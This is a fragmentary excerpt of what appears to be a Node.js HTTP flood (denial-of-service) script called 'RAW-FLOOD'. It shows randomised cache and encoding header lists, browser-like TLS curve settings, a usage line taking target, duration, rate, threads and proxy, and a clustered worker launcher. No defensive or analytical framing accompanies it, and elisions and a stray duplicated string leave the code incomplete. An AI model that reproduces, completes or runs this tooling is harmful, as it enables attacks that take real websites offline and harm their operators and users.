...
cache_header = [
'max-age=0', 'no-cache', 'no-store', 'pre-check=0', 'post-check=0', 'must-revalidate', 'proxy-revalidate', 's-maxage=604800', 'no-cache, no-store,private, max-age=0, must-revalidate', 'no-cache, no-store,private, s-maxage=604800, must-revalidate', 'no-cache, no-store,private, max-age=604800, must-revalidate', 'no-transform', 'only-if-cached', 'public', 'private', 'stale-if-error', 'max-age=31557600', 'max-age=2592000', 's-maxage', 'min-fresh', 'max-age=31536000,public', 'max-age=31536000,public,immutable', 'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0', 'public, immutable, max-age=31536000', 'max-stale', 'max-age=315360000', 'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800'

],
Generate_Encoding = [ '*', 'br', 'gzip, deflate', 'br;q=1.0, gzip;q=0.8, *;q=0.1', 'gzip', 'gzip, compress', 'compress, deflate', 'compress', 'gzip, deflate, br', 'deflate', 'gzip, deflate, lzma, sdch', 'compress;q=0.5, gzip;q=1.0', 'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25', 'gzip;q=1.0, identity; q=0.5, *;q=0', '*/*'
...
sec_ch_ua = [
 ...
 if (process.argv.length < 7){console.log(`node target time rate thread proxy`); process.exit();}
...
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";"GREASE:X25519:x25519";
 ...
 const parsedTarget = url.parse(args.target);
  ...
  if (cluster.isMaster) {
    console.clear()
    console.log(`RAW-FLOOD shit not working `.rainbow)
    console.log(`--------------------------------------------`.gray)
